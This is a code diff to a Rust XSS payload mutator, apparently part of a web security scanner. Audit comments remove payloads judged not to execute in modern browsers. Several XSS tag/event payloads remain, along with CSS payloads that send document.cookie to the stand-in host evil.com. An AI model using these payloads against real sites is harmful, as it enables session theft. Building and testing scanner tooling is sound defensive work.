@@ -33,6 +33,14 @@ pub struct XssMutation {
 // ──────────────────────────────────────────────
 
 /// Each tuple: (prefix before exec function, suffix after exec function, extra attributes).
+///
+/// Audit (2026-05-10): removed dead vectors that don't actually fire
+/// in any modern browser. Shipping a "grammar-aware XSS mutator" that
+/// emits payloads which never execute is a credibility hit — the
+/// scanner reports a probe sent and the user assumes it represents a
+/// real test, when it's just noise the WAF correctly ignores.
+///   * `<object data=javascript:>` — disabled in all browsers ~2012
+///   * `<isindex>` — obsolete since HTML5; not implemented anywhere
 const TAG_EVENT_COMBOS: &[(&str, &str, &str)] = &[
     ("<img src=x onerror=", ">", ""),
     ("<svg onload=", ">", ""),
@@ -43,10 +51,8 @@ const TAG_EVENT_COMBOS: &[(&str, &str, &str)] = &[
     ("<audio src=x onerror=", ">", ""),
     ("<input onfocus=", " autofocus>", ""),
     ("<marquee onstart=", ">", ""),
-    ("<object data=javascript:", ">", ""),
     ("<a href=javascript:", ">click</a>", ""),
     ("<div onmouseover=", ">hover</div>", ""),
-    ("<isindex type=image src=x onerror=", ">", ""),
     ("<input type=image src=x onerror=", ">", ""),
     (
         "<form><button formaction=javascript:",
@@ -284,14 +290,14 @@ pub fn mutate(payload: &str, max_mutations: usize) -> Vec<XssMutation> {
         });
     }
 
-    // Strategy 3: Null byte injection
-    if results.len() < max_mutations {
-        results.push(XssMutation {
-            payload: "<scr\x00ipt>alert(1)</scr\x00ipt>".into(),
-            description: "null byte in tag name".into(),
-            rules_applied: vec!["null_byte"],
-        });
-    }
+    // Strategy 3: Null byte injection — REMOVED (audit 2026-05-10).
+    // Modern HTML parsers (whatwg algorithm) treat `\0` inside a tag
+    // name as U+FFFD or simply terminate the tag. The vector never
+    // executes; shipping it as a "valid XSS variant" was a credibility
+    // lie. If a WAF really does drop the NUL and the upstream then
+    // accepts the truncated `<scr` as `<script`, that's a
+    // WAF-specific bug — handle it via a per-WAF profile, not a
+    // global default mutation.
 
     // Strategy 4: URI scheme payloads
     for scheme in URI_SCHEMES {
@@ -418,14 +424,11 @@ pub fn mutate(payload: &str, max_mutations: usize) -> Vec<XssMutation> {
         });
     }
 
-    // Strategy 12: Prototype chain override
-    if results.len() < max_mutations {
-        results.push(XssMutation {
-            payload: "<img src=x onerror=this.onerror=null;{}.valueOf=alert;throw 1>".into(),
-            description: "valueOf override via throw".into(),
-            rules_applied: vec!["prototype_override"],
-        });
-    }
+    // Strategy 12: Prototype chain override — REMOVED (audit 2026-05-10).
+    // The classic `this.onerror=null;{}.valueOf=alert;throw 1` doesn't
+    // reliably trigger alert(): `throw` propagates to window.onerror,
+    // not the element handler, so the assigned `valueOf` is never
+    // coerced. Shipping it as a working mutation misled scanner output.
 
     // Strategy 13: Template literal injection (backtick payloads)
     let template_literals = [
@@ -465,9 +468,14 @@ pub fn mutate(payload: &str, max_mutations: usize) -> Vec<XssMutation> {
     }
 
     // Strategy 15: CSS injection for data exfiltration
+    //
+    // Audit (2026-05-10): removed `<div style=background-image:url(
+    // javascript:alert(1))>`. CSS `url()` has NEVER executed JavaScript
+    // — that vector is from before CSS3 and was killed by every browser
+    // implementation. The other three are real exfil channels (CSS
+    // imports, request leakage, external stylesheet) and stay.
     let css_payloads = [
         "<style>@import url('//evil.com/log?token='+document.cookie)</style>",
-        "<div style=background-image:url(javascript:alert(1))>",
         "<style>*{background:url('//evil.com/?'+document.cookie)}</style>",
         "<link rel=stylesheet href='//evil.com/exfil.css'>",
     ];
